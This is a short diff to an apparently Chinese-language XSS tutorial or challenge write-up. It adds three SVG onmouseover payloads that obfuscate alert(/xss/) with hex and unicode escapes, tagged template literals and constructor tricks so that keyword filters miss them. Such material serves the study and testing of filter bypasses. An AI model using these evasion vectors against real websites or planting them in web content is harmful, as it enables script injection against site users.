@@ -219,4 +219,9 @@ top可以连接一个函数，那么直接连接alert就行了，如果你看过
 
 ![27](https://ws1.sinaimg.cn/large/005DAKuvgy1g20vs1ujajj30vn09g752.jpg)
 
-执行字符串的可用`payload`，
+执行字符串的可用`payload`：
+```html
+<svg onmouseover=setTimeout`al\x65rt\x28/xss/\x29```>
+<svg onmouseover=Set.constructor`al\x65rt\x28/xss/\x29```>
+<svg onmouseover=\u0063lear.constructor`al\x65rt\x28/xss/\x29```>
+```
